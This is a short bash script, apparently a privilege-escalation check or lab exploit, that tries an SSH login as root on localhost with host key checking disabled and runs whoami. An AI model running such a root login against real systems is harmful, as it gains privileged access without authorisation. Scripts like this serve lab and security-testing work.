#!/usr/bin/env bash
set -e

# Exploit SSH key access: login as root via SSH key
ssh -o StrictHostKeyChecking=no root@localhost whoami 2> /dev/null
